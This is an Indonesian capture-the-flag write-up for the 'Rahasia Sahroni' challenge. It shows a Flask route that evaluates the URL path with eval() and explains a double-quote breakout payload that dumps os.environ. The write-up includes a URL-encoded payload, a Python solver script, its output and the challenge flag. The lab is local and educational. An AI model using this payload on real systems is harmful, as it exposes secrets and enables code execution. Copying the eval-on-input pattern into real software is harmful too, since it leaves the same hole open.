# WriteUp: Rahasia Sahroni

## Overview

* **Judul:** Rahasia Sahroni
* **Kategori:** Input Injection
* **Poin:** 500
* **Deskripsi:** Bisa ngga lu mengungkap rahasia Sahroni?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `codex7.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Sahroni]
└─$ tree
.
├── codex7.yml
└── exploit.py

0 directories, 2 files

```

**Konten File (`codex7.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/codex7:latest
    ports:
      - "1337:1337"
    environment:
      - PWN=${PWN:-testuser}
    restart: unless-stopped

```

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose pada port **1337**.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Sahroni]
└─$ PWN=WanZKey docker compose -f codex7.yml up -d --build
[+] up 14/14
 ✔ Image ghcr.io/hengkerrusia/codex7:latest Pulled
 ✔ Container rahasiasahroni-web-1 Created

```

### 2. Source Code Analysis (White Box)

Melakukan inspeksi file `app.py` di dalam container. Ditemukan penggunaan fungsi `eval()` yang tidak aman pada route URL path.

**Snippet Vulnerable (`app.py`):**

```python
@app.route('/<path:user_input>')
def index(user_input):
    try:
        # VULNERABILITY: Input diambil dari URL Path
        # Input dibungkus dengan DOUBLE QUOTES (") dalam f-string
        result = eval(f'"{user_input}"')
        return render_template('index.html', result=result)
    except Exception:
        return "Internal Server Error", 500

```

**Analisis Kerentanan:**

1. **Injection Point:** Aplikasi menerima input langsung dari URL path (`/<path:user_input>`).
2. **Vulnerable Function:** Input dimasukkan ke dalam fungsi `eval()`, namun kali ini dibungkus dengan tanda kutip dua (`"`).
* Code server: `eval(f'"{user_input}"')`


3. **Payload Strategy:** Untuk melakukan injeksi kode Python, kita harus "keluar" dari string pembungkus (breakout) menggunakan tanda kutip dua (`"`), lalu menyambungkan string dengan kode kita.
* Payload Logic: `" + str(os.environ) + "`
* Hasil di Server: `"" + str(os.environ) + ""`



### 3. Exploitation

Eksploitasi dapat dilakukan melalui browser atau script.

**Payload URL Encoded (Browser):**

```
http://localhost:1337/%22%20+%20str(os.environ)%20+%20%22

```

* `%22` = `"` (Double Quote)
* `%20` = `     ` (Space)
* `+` = Concatenation Operator (Python)

## Script Solver

Script Python untuk mengirimkan payload injection ke URL path secara otomatis.

**File:** `exploit.py`

```python
import requests
import re

# Target URL (Port 1337)
URL = "http://localhost:1337"

def exploit():
    print(f"[*] Target: {URL}")
    
    # Payload: " + str(os.environ) + "
    # Menggunakan double quote untuk breakout dari f-string server
    raw_payload = '" + str(os.environ) + "'
    
    # Path Injection
    target_url = f"{URL}/{raw_payload}"
    print(f"[*] Sending Payload to Path: {target_url}")
    
    try:
        # Kirim GET request
        r = requests.get(target_url)
        
        if r.status_code == 200:
            print("[+] Injection Successful!")
            
            # Cari Flag format pwn{...}
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            if flag:
                print(f"\n[!!!] FLAG FOUND IN ENV: {flag.group(0)}\n")
            else:
                print("[-] Flag regex failed.")
                print(r.text[:500])
        else:
            print(f"[-] Failed. Status: {r.status_code}")

    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    exploit()

```

## Output Terminal Solver

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Input Injection/Rahasia Sahroni]
└─$ python3 exploit.py
[*] Target: http://localhost:1337
[*] Sending Payload to Path: http://localhost:1337/" + str(os.environ) + "
[+] Injection Successful!

[!!!] FLAG FOUND IN ENV: pwn{bb1dac1ca974d8e2de61f3863b90bb07}

```

## Flag

```
pwn{bb1dac1ca974d8e2de61f3863b90bb07}

```
